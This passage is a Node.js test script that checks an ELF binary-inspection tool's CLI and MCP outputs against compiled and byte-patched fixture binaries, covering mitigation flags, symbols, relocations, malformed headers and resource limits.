#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  copyFile,
  mkdir,
  readFile,
  readdir,
  writeFile,
} from "node:fs/promises";
import { dirname, isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import {
  OwnedCommandFailure,
  runOwnedCommand,
} from "../dist/process/OwnedCommand.js";
import { parseEvidence } from "../dist/domain/evidence.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { sectionNameFixtures } from "./lib/elf-section-name-fixtures.mjs";
import { withLargeResultMcp } from "./lib/large-result-mcp.mjs";

const verifyLargeMcp = process.env.REA_VERIFY_LARGE_ELF_MCP === "1";
const python = process.env.REA_PWNTOOLS_PYTHON;
const strace = process.env.REA_VERIFY_STRACE_COMMAND;
if (
  process.platform !== "linux" ||
  process.arch !== "x64" ||
  !isAbsolute(python ?? "") ||
  !isAbsolute(strace ?? "")
)
  throw new Error(
    "verify:binary:layout requires Linux x64, absolute REA_PWNTOOLS_PYTHON (pwntools 4.15.0/pyelftools 0.33/Unicorn 2.1.2) and REA_VERIFY_STRACE_COMMAND. gcc, ld and strip must be available. No target is executed.",
  );
const run = createVerifierRun();
const execute = promisify(execFile);
for (const command of ["gcc", "ld", "strip", "/usr/bin/prlimit", strace]) {
  try {
    await execute(command, [command === strace ? "-V" : "--version"], {
      timeout: 10_000,
      maxBuffer: 1024 * 1024,
    });
  } catch (cause) {
    throw new Error(
      `verify:binary:layout prerequisite unavailable: ${command}`,
      { cause },
    );
  }
}
const entrypoint =
  process.argv[2] ?? fileURLToPath(new URL("./rea.mjs", import.meta.url));
const root = await PrivateRuntimeRoot.create({
  prefix: "rea-layout-verifier-",
});
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const limitedPython = join(root.path, "limited-python");
const limitedEnvironment = (option) => ({
  ...environment,
  REA_PWNTOOLS_PYTHON: limitedPython,
  REA_VERIFY_LIMITED_PYTHON: python,
  REA_VERIFY_LIMIT_OPTION: option,
});
const client = new Client({ name: "binary-layout-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const source = fileURLToPath(
  new URL("./fixtures/binary-layout.c", import.meta.url),
);
const highSource = fileURLToPath(
  new URL("./fixtures/binary-layout-high.S", import.meta.url),
);
let cases = 0;
let bootstrapCases = 0;
const failures = [];
try {
  await execute(
    "gcc",
    [
      "-std=c11",
      "-Wall",
      "-Wextra",
      "-Werror",
      fileURLToPath(
        new URL("./fixtures/binary-layout-limited-python.c", import.meta.url),
      ),
      "-o",
      limitedPython,
    ],
    { timeout: 30_000, maxBuffer: 1024 * 1024 },
  );
  // A live limited child must retain its configured launcher's identity so
  // timeout cleanup can still verify and terminate the entire owned group.
  await assert.rejects(
    runOwnedCommand(
      {
        command: limitedPython,
        arguments: [
          "-I",
          "-c",
          "import time; print('limited child ready', flush=True); time.sleep(60)",
        ],
        cwd: root.path,
        runId: `${run.run_id}-limited-python-timeout`,
        hostEnvironment: limitedEnvironment("--as=2147483648"),
      },
      { timeoutMs: 2000, diagnosticBytes: 1024 },
    ),
    (error) => {
      assert.ok(error instanceof OwnedCommandFailure);
      assert.equal(error.reason, "timeout");
      assert.equal(error.cleanupFailure, null);
      assert.ok(error.snapshot.stdout.text.includes("limited child ready"));
      return true;
    },
  );
  const bootstrapRoot = join(root.path, "bootstrap-boundary");
  await mkdir(bootstrapRoot);
  const bootstrapPath = join(bootstrapRoot, "layout.py");
  await copyFile(
    join(dirname(dirname(entrypoint)), "bridge/pwntools/layout.py"),
    bootstrapPath,
  );
  for (const [source, status] of [
    ["raise MemoryError('source-owned initialization failure')", 75],
    ["raise OSError(12, 'source-owned allocation failure')", 75],
    ["raise OSError(27, 'source-owned file write failure')", 76],
    [
      "raise OSError(2, 'MemoryError-like text is not an allocation failure')",
      1,
    ],
  ]) {
    await writeFile(join(bootstrapRoot, "layout_impl.py"), source);
    const markerPath = join(bootstrapRoot, `failure-${bootstrapCases}`);
    let exitCode = 0;
    try {
      await execute(
        python,
        ["-I", bootstrapPath, markerPath, "unused-request"],
        {
          timeout: 10000,
          maxBuffer: 1024 * 1024,
        },
      );
    } catch (cause) {
      assert.equal(typeof cause.code, "number");
      exitCode = cause.code;
    }
    assert.equal(exitCode, status);
    if (status === 75 || status === 76)
      assert.equal(
        await readFile(markerPath, "ascii"),
        status === 75 ? "M" : "F",
      );
    else await assert.rejects(readFile(markerPath), { code: "ENOENT" });
    bootstrapCases++;
  }
  for (const [name, flags] of [
    [
      "protected",
      [
        "-fPIE",
        "-pie",
        "-fstack-protector-all",
        "-Wl,-z,relro,-z,now",
        "-Wl,-z,noexecstack",
      ],
    ],
    [
      "plain",
      [
        "-fno-pie",
        "-no-pie",
        "-fno-stack-protector",
        "-Wl,-z,norelro",
        "-Wl,-z,execstack",
      ],
    ],
    ["relocatable", ["-c", "-fcommon", "-fPIC"]],
    ["library", ["-shared", "-fPIC", "-fno-stack-protector"]],
    ["packed-relative", ["-shared", "-fPIC", "-Wl,-z,pack-relative-relocs"]],
  ])
    await execute(
      "gcc",
      ["-O1", "-g", ...flags, source, "-o", join(root.path, name)],
      { timeout: 30_000, maxBuffer: 1024 * 1024 },
    );
  const sectionlessBytes = await readFile(join(root.path, "protected"));
  sectionlessBytes.writeBigUInt64LE(0n, 40);
  sectionlessBytes.writeUInt16LE(0, 60);
  sectionlessBytes.writeUInt16LE(0, 62);
  await writeFile(join(root.path, "sectionless"), sectionlessBytes);
  const nullBytes = Buffer.from(await readFile(join(root.path, "protected")));
  const phOffset = Number(nullBytes.readBigUInt64LE(32));
  const phSize = nullBytes.readUInt16LE(54);
  const phCount = nullBytes.readUInt16LE(56);
  const unusedIndex = Array.from({ length: phCount }, (_, index) => index).find(
    (index) => nullBytes.readUInt32LE(phOffset + index * phSize) === 0x6474e551,
  );
  assert.notEqual(
    unusedIndex,
    undefined,
    "Required stack fixture header absent",
  );
  const unusedHeader = phOffset + unusedIndex * phSize;
  nullBytes.writeUInt32LE(0, unusedHeader);
  for (const field of [8, 32, 40])
    nullBytes.writeBigUInt64LE(0xffffffffffffffffn, unusedHeader + field);
  await writeFile(join(root.path, "unused-segment"), nullBytes);
  const emptyBytes = Buffer.from(nullBytes);
  emptyBytes.writeUInt32LE(1, unusedHeader);
  emptyBytes.writeBigUInt64LE(0n, unusedHeader + 32);
  emptyBytes.writeBigUInt64LE(0n, unusedHeader + 40);
  await writeFile(join(root.path, "empty-segment"), emptyBytes);
  await copyFile(join(root.path, "protected"), join(root.path, "stripped"));
  await execute("strip", ["--strip-all", join(root.path, "stripped")], {
    timeout: 10_000,
  });
  await execute("gcc", ["-c", highSource, "-o", join(root.path, "high.o")], {
    timeout: 10_000,
  });
  await execute(
    "ld",
    [
      "-Ttext=0x20000000000001",
      "-o",
      join(root.path, "high"),
      join(root.path, "high.o"),
    ],
    { timeout: 10_000 },
  );
  await client.connect(transport);
  const reports = new Map();
  for (const name of [
    "protected",
    "plain",
    "relocatable",
    "library",
    "packed-relative",
    "stripped",
    "sectionless",
    "unused-segment",
    "empty-segment",
    "high",
  ]) {
    const path = join(root.path, name);
    const bytes = await readFile(path);
    const sha256 = createHash("sha256").update(bytes).digest("hex");
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, path);
      assert.equal(value.artifact.sha256, sha256);
      assert.equal(value.artifact.bytes, bytes.length);
      assert.equal(value.runtime_load_base, null);
      assert.equal(value.linkage.runtime_library_paths, null);
      assert.equal(value.mitigations.evidence_kind, "inferred");
      if (name === "sectionless") {
        assert.equal(value.sections.length, 0);
        assert.equal(value.symbols.length, 0);
        assert.deepEqual(
          value.linkage.needed_libraries,
          reports.get("protected").linkage.needed_libraries,
        );
        assert.ok(
          value.linkage.needed_libraries.every(
            (name) => name.location !== null && name.bytes_base64 !== null,
          ),
        );
        // Preserve the unchanged engine's section-dependent heuristic and its
        // explicit coverage limitation, rather than inventing a stronger label.
        assert.equal(value.mitigations.relro, "Partial");
        assert.ok(
          value.limitations.some((item) =>
            item.includes("RELRO/canary indicators may be incomplete"),
          ),
        );
      } else
        assert.ok(
          value.sections.some((section) => section.file_backing === "none"),
        );
      for (const section of value.sections) {
        assert.ok(typeof section.address === "string");
        if (section.file_backing === "file")
          assert.ok(
            BigInt(section.offset) + BigInt(section.size) <=
              BigInt(bytes.length),
          );
      }
      if (name === "unused-segment" || name === "empty-segment") {
        const segment = value.segments[unusedIndex];
        assert.equal(segment.file_backing, "none");
        assert.equal(segment.offset, "0xffffffffffffffff");
        if (name === "unused-segment") assert.equal(segment.permissions, null);
        else assert.notEqual(segment.permissions, null);
      }
      assert.equal(value.relocation_inventory_completeness, "unknown");
      if (name === "library" || name === "packed-relative") {
        assert.equal(value.entry_point.reported_value, "0x0");
        assert.equal(value.entry_point.meaning, "absent");
      }
      if (name === "packed-relative") {
        assert.ok(value.packed_relative_relocations.length > 0);
        for (const table of value.packed_relative_relocations) {
          assert.equal(table.evidence_kind, "derived");
          assert.equal(table.offset_meaning, "linked-virtual-address");
          assert.equal(table.entry_source_locations, null);
          assert.equal(table.addends, null);
          assert.ok(table.entries.length > 0);
          const start = Number(BigInt(table.location.offset));
          const length = Number(BigInt(table.location.bytes));
          assert.deepEqual(
            Buffer.from(table.encoded_bytes_base64, "base64"),
            bytes.subarray(start, start + length),
          );
        }
      }
      reports.set(name, value);
      assert.deepEqual(await readFile(path), bytes);
      cases++;
    }
  }
  const protectedReport = reports.get("protected");
  const fileSymbols = protectedReport.symbols.filter(
    (symbol) => symbol.type === "STT_FILE",
  );
  assert.ok(fileSymbols.length > 0);
  assert.ok(
    fileSymbols.every((symbol) => symbol.value_meaning === "no-address"),
  );
  const plain = reports.get("plain");
  assert.equal(protectedReport.mitigations.position_independent, true);
  assert.equal(protectedReport.mitigations.nx_indicator, true);
  assert.equal(protectedReport.mitigations.stack_canary_indicator, true);
  assert.equal(protectedReport.mitigations.relro, "Full");
  assert.equal(plain.mitigations.position_independent, false);
  assert.equal(plain.mitigations.nx_indicator, null);
  assert.equal(plain.mitigations.executable_stack_indicator, true);
  assert.equal(protectedReport.mitigations.executable_stack_indicator, false);
  assert.equal(plain.mitigations.stack_canary_indicator, false);
  assert.equal(plain.mitigations.relro, null);
  const relocatable = reports.get("relocatable");
  assert.equal(relocatable.entry_point.meaning, "not-applicable");
  assert.ok(relocatable.relocations.length > 0);
  assert.ok(
    relocatable.relocations.every(
      (item) => item.target.kind === "section-offset",
    ),
  );
  assert.ok(
    relocatable.relocations.some((item) => BigInt(item.addend ?? "0") < 0n),
  );
  assert.equal(
    relocatable.symbols.find((symbol) => symbol.name.display === "common_value")
      .value_meaning,
    "alignment",
  );
  assert.equal(
    reports
      .get("library")
      .symbols.find((symbol) => symbol.name.display === "tls_value")
      .value_meaning,
    "tls-offset",
  );
  assert.equal(
    reports.get("high").entry_point.reported_value,
    "0x20000000000001",
  );
  assert.equal(
    reports
      .get("high")
      .symbols.find((symbol) => symbol.name.display === "absolute_value").value,
    "0x20000000000007",
  );
  assert.equal(
    reports
      .get("high")
      .symbols.find((symbol) => symbol.name.display === "absolute_value")
      .value_meaning,
    "absolute-value",
  );
  assert.ok(
    reports.get("stripped").symbols.length < protectedReport.symbols.length,
  );
  const object = await readFile(join(root.path, "relocatable"));
  const name = relocatable.symbols.find(
    (symbol) => symbol.name.display === "read_values",
  ).name;
  const changed = Buffer.from(object);
  changed[Number(BigInt(name.location.offset))] = 0xff;
  const opaque = join(root.path, "opaque-name.o");
  await writeFile(opaque, changed);
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, opaque);
    const symbol = value.symbols.find((item) =>
      item.name.display.endsWith("ead_values"),
    );
    assert.equal(Buffer.from(symbol.name.bytes_base64, "base64")[0], 0xff);
    assert.equal(symbol.name.location.offset, name.location.offset);
    assert.deepEqual(await readFile(opaque), changed);
    cases++;
  }
  const sectionBearingBytes = await readFile(join(root.path, "protected"));
  const dynamicSegment = protectedReport.segments.find(
    (segment) => segment.type === "PT_DYNAMIC",
  );
  const interpreterSegment = protectedReport.segments.find(
    (segment) => segment.type === "PT_INTERP",
  );
  assert.notEqual(dynamicSegment, undefined);
  assert.notEqual(interpreterSegment, undefined);
  const dependency = protectedReport.linkage.needed_libraries[0];
  assert.notEqual(dependency, undefined);
  assert.notEqual(dependency.location, null);
  for (const [profile, original] of [
    ["section-bearing", sectionBearingBytes],
    ["sectionless", sectionlessBytes],
  ]) {
    for (const facet of ["dependency", "interpreter"]) {
      const bytes = Buffer.from(original);
      const reference =
        facet === "dependency"
          ? dependency
          : protectedReport.linkage.interpreters[0];
      assert.notEqual(reference, undefined);
      assert.notEqual(reference.location, null);
      const raw = Buffer.from(reference.bytes_base64, "base64");
      const changedIndex = facet === "dependency" ? 0 : 1;
      raw[changedIndex] = 0xff;
      bytes[Number(BigInt(reference.location.offset)) + changedIndex] = 0xff;
      const path = join(root.path, `opaque-${profile}-${facet}`);
      await writeFile(path, bytes);
      for (const mode of ["cli", "mcp"]) {
        const value = await inspect(mode, path);
        const actual =
          facet === "dependency"
            ? value.linkage.needed_libraries[0]
            : value.linkage.interpreters[0];
        assert.deepEqual(actual, {
          ...reference,
          display: raw.toString("utf8"),
          bytes_base64: raw.toString("base64"),
        });
        assert.equal(
          value.artifact.sha256,
          createHash("sha256").update(bytes).digest("hex"),
        );
        assert.deepEqual(await readFile(path), bytes);
        cases++;
      }
    }
  }
  for (const fixture of sectionNameFixtures(
    sectionBearingBytes,
    protectedReport,
  )) {
    const path = join(root.path, `section-names-${fixture.name}`);
    await writeFile(path, fixture.bytes);
    for (const mode of ["cli", "mcp"]) {
      if (
        fixture.expectation === "resolved" &&
        mode === "mcp" &&
        !verifyLargeMcp
      )
        continue;
      // Ordinary cases retain the SDK default. Only this complete 65,281-row
      // case selects a larger receive budget; production data is not truncated.
      const value =
        fixture.expectation === "resolved" && mode === "mcp"
          ? await withLargeResultMcp(
              { entrypoint, environment, maxBufferSize: 256 * 1024 * 1024 },
              (largeClient) =>
                inspect(mode, path, undefined, environment, largeClient),
            )
          : await inspect(
              mode,
              path,
              fixture.expectation === "invalid_input"
                ? "invalid_input"
                : undefined,
            );
      if (fixture.expectation === "absent") {
        assert.deepEqual(value.symbols, protectedReport.symbols);
        assert.deepEqual(
          value.sections.map((section) => section.name),
          protectedReport.sections.map(() => ({
            display: "",
            bytes_base64: null,
            location: null,
            unknown_reason:
              "ELF declares no section-name table (SHN_UNDEF index 0).",
          })),
        );
        assert.deepEqual(
          value.sections.map((section) => section.name_offset),
          protectedReport.sections.map((section) => section.name_offset),
        );
      } else if (fixture.expectation === "resolved") {
        assert.equal(value.sections.length, fixture.sectionCount);
        assert.deepEqual(
          value.sections[fixture.tableIndex].name,
          protectedReport.sections[sectionBearingBytes.readUInt16LE(62)].name,
        );
        assert.deepEqual(value.symbols, protectedReport.symbols);
      }
      cases++;
    }
    assert.deepEqual(await readFile(path), fixture.bytes);
  }
  // Malformed references must fail before the decoder reads unrelated bytes.
  const neededTagOffsets = [];
  let stringSizeTagOffset;
  for (
    let offset = Number(BigInt(dynamicSegment.offset));
    offset <
    Number(BigInt(dynamicSegment.offset) + BigInt(dynamicSegment.file_size));
    offset += 16
  ) {
    const tag = sectionBearingBytes.readBigUInt64LE(offset);
    if (tag === 0n) break;
    if (tag === 1n) neededTagOffsets.push(offset + 8);
    if (tag === 10n) stringSizeTagOffset = offset + 8;
  }
  assert.ok(neededTagOffsets.length > 0);
  assert.notEqual(stringSizeTagOffset, undefined);
  for (const [profile, original] of [
    ["section-bearing", sectionBearingBytes],
    ["sectionless", sectionlessBytes],
  ]) {
    for (const problem of ["offset-at-end", "truncated-table"]) {
      const bytes = Buffer.from(original);
      if (problem === "offset-at-end")
        bytes.writeBigUInt64LE(
          bytes.readBigUInt64LE(stringSizeTagOffset),
          neededTagOffsets[0],
        );
      else {
        assert.ok(bytes.readBigUInt64LE(neededTagOffsets[0]) > 0n);
        bytes.writeBigUInt64LE(1n, stringSizeTagOffset);
      }
      const path = join(root.path, `invalid-dependency-${profile}-${problem}`);
      await writeFile(path, bytes);
      for (const mode of ["cli", "mcp"]) {
        await inspect(mode, path, "invalid_input");
        cases++;
      }
      assert.deepEqual(await readFile(path), bytes);
    }
  }
  for (const type of ["SHT_SYMTAB", "SHT_DYNSYM"]) {
    const table = protectedReport.sections.find(
      (section) => section.type === type,
    );
    const other = protectedReport.sections.find(
      (section) => section.type === "SHT_PROGBITS",
    );
    assert.notEqual(table, undefined);
    assert.notEqual(other, undefined);
    const header = Number(BigInt(table.header_location.offset));
    const strings = protectedReport.sections[table.link];
    assert.equal(strings.type, "SHT_STRTAB");
    for (const problem of [
      "out-of-range",
      "null",
      "wrong-type",
      "undeclared-header",
    ]) {
      let bytes = Buffer.from(sectionBearingBytes);
      let link =
        problem === "null"
          ? 0
          : problem === "wrong-type"
            ? other.index
            : protectedReport.sections.length + 100;
      if (problem === "undeclared-header") {
        // Upstream can read an otherwise valid header beyond declared e_shnum.
        const end =
          Number(bytes.readBigUInt64LE(40)) +
          protectedReport.sections.length * bytes.readUInt16LE(58);
        const extended = Buffer.alloc(Math.max(bytes.length, end + 64));
        bytes.copy(extended);
        const start = Number(BigInt(strings.header_location.offset));
        bytes.copy(extended, end, start, start + 64);
        bytes = extended;
        link = protectedReport.sections.length;
      }
      bytes.writeUInt32LE(link, header + 40);
      const path = join(root.path, `invalid-symbol-link-${type}-${problem}`);
      await writeFile(path, bytes);
      for (const mode of ["cli", "mcp"]) {
        await inspect(mode, path, "invalid_input");
        cases++;
      }
      assert.deepEqual(await readFile(path), bytes);
    }
  }
  const shortDynamic = Buffer.from(sectionBearingBytes);
  shortDynamic.writeBigUInt64LE(
    16n,
    Number(BigInt(dynamicSegment.header_location.offset)) + 32,
  );
  assert.notEqual(
    shortDynamic.readBigUInt64LE(Number(BigInt(dynamicSegment.offset))),
    0n,
  );
  const paddedInterpreter = Buffer.from(sectionBearingBytes);
  const interpreterStart = Number(BigInt(interpreterSegment.offset));
  paddedInterpreter[interpreterStart + 2] = 0;
  const paddedInterpreterPath = join(root.path, "padded-interpreter");
  await writeFile(paddedInterpreterPath, paddedInterpreter);
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, paddedInterpreterPath);
    assert.deepEqual(value.linkage.interpreters, [
      {
        display: "/l",
        bytes_base64: Buffer.from("/l").toString("base64"),
        location: { offset: interpreterSegment.offset, bytes: "0x3" },
        unknown_reason: null,
      },
    ]);
    assert.equal(
      value.segments[interpreterSegment.index].file_size,
      interpreterSegment.file_size,
    );
    assert.deepEqual(await readFile(paddedInterpreterPath), paddedInterpreter);
    cases++;
  }
  const unterminatedInterpreter = Buffer.from(sectionBearingBytes);
  unterminatedInterpreter.fill(
    0x58,
    interpreterStart,
    interpreterStart + Number(BigInt(interpreterSegment.file_size)),
  );
  const zeroSymbolEntries = ["SHT_SYMTAB", "SHT_DYNSYM"].map((type) => {
    const section = protectedReport.sections.find((item) => item.type === type);
    assert.notEqual(
      section,
      undefined,
      `Required fixture table absent: ${type}`,
    );
    const bytes = Buffer.from(sectionBearingBytes);
    bytes.writeBigUInt64LE(
      0n,
      Number(BigInt(section.header_location.offset)) + 56,
    );
    return [`zero-entry-${type}`, bytes, "invalid_input"];
  });
  const undersizedSymbolEntries = ["SHT_SYMTAB", "SHT_DYNSYM"].map((type) => {
    const section = protectedReport.sections.find((item) => item.type === type);
    assert.notEqual(section, undefined);
    const bytes = Buffer.from(sectionBearingBytes);
    const header = Number(BigInt(section.header_location.offset));
    bytes.writeBigUInt64LE(8n, header + 32);
    bytes.writeBigUInt64LE(8n, header + 56);
    return [`undersized-entry-${type}`, bytes, "invalid_input"];
  });
  const nonintegralSymbolEntries = ["SHT_SYMTAB", "SHT_DYNSYM"].map((type) => {
    const section = protectedReport.sections.find((item) => item.type === type);
    assert.notEqual(section, undefined);
    const bytes = Buffer.from(sectionBearingBytes);
    const header = Number(BigInt(section.header_location.offset));
    const size = bytes.readBigUInt64LE(header + 32);
    assert.ok(size + 1n <= BigInt(bytes.length) - BigInt(section.offset));
    bytes.writeBigUInt64LE(size + 1n, header + 32);
    return [`nonintegral-entry-count-${type}`, bytes, "invalid_input"];
  });
  const relocationSection = relocatable.sections.find(
    (item) => item.type === "SHT_RELA",
  );
  assert.notEqual(relocationSection, undefined);
  const undersizedRelocationEntries = [
    ["REL", 9],
    ["RELA", 4],
  ].map(([type, sectionType]) => {
    const bytes = Buffer.from(object);
    const header = Number(BigInt(relocationSection.header_location.offset));
    bytes.writeUInt32LE(sectionType, header + 4);
    bytes.writeBigUInt64LE(8n, header + 32);
    bytes.writeBigUInt64LE(8n, header + 56);
    return [`undersized-entry-${type}`, bytes, "invalid_input"];
  });
  const nonintegralRelocationEntries = [
    ["RELA", 4, 24],
    ["REL", 9, 16],
  ].map(([type, sectionType, entrySize]) => {
    const bytes = Buffer.from(object);
    const header = Number(BigInt(relocationSection.header_location.offset));
    bytes.writeUInt32LE(sectionType, header + 4);
    bytes.writeBigUInt64LE(BigInt(entrySize + 1), header + 32);
    bytes.writeBigUInt64LE(BigInt(entrySize), header + 56);
    return [`nonintegral-entry-count-${type}`, bytes, "invalid_input"];
  });
  const invalidRelocationReferences = [
    ["missing-symbol-table", relocatable.sections.length + 100],
    ["wrong-symbol-table-kind", 1],
    ["positive-symbol-without-table", 0],
    ["missing-relocation-symbol", null],
  ].map(([name, link]) => {
    const bytes = Buffer.from(object);
    const header = Number(BigInt(relocationSection.header_location.offset));
    if (link === null) {
      const offset = Number(BigInt(relocationSection.offset)) + 8;
      const type = bytes.readBigUInt64LE(offset) & 0xffffffffn;
      bytes.writeBigUInt64LE((0xffffffffn << 32n) | type, offset);
    } else bytes.writeUInt32LE(link, header + 40);
    return [name, bytes, "invalid_input"];
  });
  const inactiveTarget = relocatable.sections.find(
    (section) => section.name.display === ".comment",
  );
  assert.notEqual(
    inactiveTarget,
    undefined,
    "Required inactive-target fixture absent",
  );
  for (const [name, targetIndex, reason] of [
    ["undefined-relocation-target", 0, "undefined-section-reference"],
    [
      "inactive-relocation-target",
      inactiveTarget.index,
      "inactive-section-header",
    ],
  ]) {
    const bytes = Buffer.from(object);
    bytes.writeUInt32LE(
      targetIndex,
      Number(BigInt(relocationSection.header_location.offset)) + 44,
    );
    if (targetIndex !== 0)
      bytes.writeUInt32LE(
        0,
        Number(BigInt(inactiveTarget.header_location.offset)) + 4,
      );
    const inactiveSymbol = relocatable.symbols.find(
      (symbol) => symbol.name.display === "read_values",
    );
    assert.notEqual(inactiveSymbol, undefined);
    if (targetIndex !== 0)
      bytes.writeUInt16LE(
        targetIndex,
        Number(BigInt(inactiveSymbol.location.offset)) + 6,
      );
    const path = join(root.path, name);
    await writeFile(path, bytes);
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, path);
      const rows = value.relocations.filter(
        (item) => item.section_index === relocationSection.index,
      );
      assert.ok(rows.length > 0);
      for (const row of rows)
        assert.deepEqual(row.target, {
          kind: "unknown-section",
          reported_section_index: targetIndex,
          offset: row.reported_offset,
          unknown_reason: reason,
        });
      if (targetIndex !== 0)
        assert.equal(
          value.symbols.find((symbol) => symbol.name.display === "read_values")
            .value_meaning,
          "unknown-section-index",
        );
      assert.deepEqual(await readFile(path), bytes);
      cases++;
    }
  }
  const relative = protectedReport.relocations.find(
    (item) => item.type === 8 && item.symbol_index === 0,
  );
  assert.notEqual(relative, undefined, "Required relative relocation absent");
  const relativeOwner = protectedReport.sections[relative.section_index];
  const noSymbolTable = Buffer.from(sectionBearingBytes);
  const relativeHeader = Number(BigInt(relativeOwner.header_location.offset));
  noSymbolTable.writeBigUInt64LE(
    BigInt(relative.location.offset),
    relativeHeader + 24,
  );
  noSymbolTable.writeBigUInt64LE(
    BigInt(relative.location.bytes),
    relativeHeader + 32,
  );
  noSymbolTable.writeUInt32LE(0, relativeHeader + 40);
  const zeroSymbolPath = join(root.path, "relative-without-symbol-table");
  await writeFile(zeroSymbolPath, noSymbolTable);
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, zeroSymbolPath);
    const reported = value.relocations.find(
      (item) => item.section_index === relative.section_index,
    );
    assert.equal(reported.symbol_table_index, 0);
    assert.equal(reported.symbol_index, 0);
    assert.equal(reported.symbol_reference_meaning, "zero-symbol-value");
    assert.deepEqual(await readFile(zeroSymbolPath), noSymbolTable);
    cases++;
  }
  const undersizedProgramHeader = Buffer.from(sectionBearingBytes);
  const missingTargetSection = Buffer.from(object);
  missingTargetSection.writeUInt32LE(
    relocatable.sections.length + 100,
    Number(BigInt(relocationSection.header_location.offset)) + 44,
  );
  undersizedProgramHeader.writeUInt16LE(8, 54);
  undersizedProgramHeader.writeUInt16LE(1, 56);
  const symbolTable = relocatable.sections.find(
    (section) => section.type === "SHT_SYMTAB",
  );
  assert.notEqual(symbolTable, undefined);
  const symbol = relocatable.symbols.find(
    (item) => item.name.display === "read_values",
  );
  assert.notEqual(symbol, undefined);
  const extendedWords = Buffer.alloc(
    Number(BigInt(symbolTable.size) / BigInt(symbolTable.entry_size)) * 4,
  );
  extendedWords.writeUInt32LE(symbol.section_index, symbol.entry_index * 4);
  const headers = Buffer.from(
    object.subarray(
      Number(BigInt(relocatable.sections[0].header_location.offset)),
      Number(
        BigInt(relocatable.sections.at(-1).header_location.offset) +
          BigInt(relocatable.sections.at(-1).header_location.bytes),
      ),
    ),
  );
  const extendedHeader = Buffer.alloc(64);
  extendedHeader.writeUInt32LE(18, 4); // SHT_SYMTAB_SHNDX
  extendedHeader.writeBigUInt64LE(BigInt(object.length), 24);
  extendedHeader.writeBigUInt64LE(BigInt(extendedWords.length), 32);
  extendedHeader.writeUInt32LE(symbolTable.index, 40);
  extendedHeader.writeBigUInt64LE(4n, 48);
  extendedHeader.writeBigUInt64LE(4n, 56);
  const extendedObject = Buffer.concat([
    object,
    extendedWords,
    headers,
    extendedHeader,
  ]);
  extendedObject.writeBigUInt64LE(
    BigInt(object.length + extendedWords.length),
    40,
  );
  extendedObject.writeUInt16LE(relocatable.sections.length + 1, 60);
  extendedObject.writeUInt16LE(
    0xffff,
    Number(BigInt(symbol.location.offset)) + 6,
  );
  const extendedPath = join(root.path, "external-symbol-index.o");
  await writeFile(extendedPath, extendedObject);
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, extendedPath);
    const reported = value.symbols.find(
      (item) => item.name.display === "read_values",
    );
    assert.equal(reported.section_index, 0xffff);
    assert.equal(reported.value_meaning, "unknown-section-index");
    assert.ok(
      value.sections.some((section) => section.type === "SHT_SYMTAB_SHNDX"),
    );
    assert.deepEqual(await readFile(extendedPath), extendedObject);
    cases++;
  }
  for (const [option, expected] of [
    ["--as=2147483648", '"address_space_bytes": 2147483648'],
    ["--cpu=20", '"cpu_seconds": 20'],
    ["--fsize=33554432", '"file_size_bytes": 33554432'],
  ]) {
    const selectedEnvironment = limitedEnvironment(option);
    const limitedClient = new Client({
      name: "limited-layout-verifier",
      version: "1",
    });
    const limitedTransport = new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      env: selectedEnvironment,
      stderr: "pipe",
    });
    try {
      await limitedClient.connect(limitedTransport);
      for (const mode of ["cli", "mcp"]) {
        const value = await inspect(
          mode,
          join(root.path, "protected"),
          undefined,
          selectedEnvironment,
          limitedClient,
        );
        assert.ok(value.limitations.some((item) => item.includes(expected)));
        cases++;
      }
    } finally {
      try {
        await limitedClient.close();
      } finally {
        await limitedTransport.close();
      }
    }
  }
  const unsupported = Buffer.from(object);
  const originalSectionOffset = Number(object.readBigUInt64LE(40));
  const sectionSize = object.readUInt16LE(58);
  const originalSectionCount = object.readUInt16LE(60);
  const sectionCount = 30000;
  const sectionOffset = Math.ceil(object.length / 8) * 8;
  const sectionHeavy = Buffer.alloc(sectionOffset + sectionCount * sectionSize);
  object.copy(sectionHeavy);
  object.copy(
    sectionHeavy,
    sectionOffset,
    originalSectionOffset,
    originalSectionOffset + originalSectionCount * sectionSize,
  );
  for (let index = originalSectionCount; index < sectionCount; index++) {
    sectionHeavy.writeUInt32LE(1, sectionOffset + index * sectionSize + 4);
    sectionHeavy.writeBigUInt64LE(1n, sectionOffset + index * sectionSize + 48);
  }
  sectionHeavy.writeBigUInt64LE(BigInt(sectionOffset), 40);
  sectionHeavy.writeUInt16LE(sectionCount, 60);
  const sectionHeavyPath = join(root.path, "section-heavy.o");
  await writeFile(sectionHeavyPath, sectionHeavy);
  // pwntools materializes each PT_LOAD zero-filled tail during inspection.
  // One allocation larger than the whole address-space budget fails promptly;
  // a large section count instead races CPU work against the command deadline.
  const memoryHeavy = Buffer.from(await readFile(join(root.path, "protected")));
  const memoryPhOffset = Number(memoryHeavy.readBigUInt64LE(32));
  const memoryPhSize = memoryHeavy.readUInt16LE(54);
  const memoryPhCount = memoryHeavy.readUInt16LE(56);
  const lastLoadIndex = Array.from(
    { length: memoryPhCount },
    (_, index) => index,
  ).findLast(
    (index) =>
      memoryHeavy.readUInt32LE(memoryPhOffset + index * memoryPhSize) === 1,
  );
  assert.notEqual(lastLoadIndex, undefined);
  const memorySizeOffset = memoryPhOffset + lastLoadIndex * memoryPhSize + 40;
  memoryHeavy.writeBigUInt64LE(
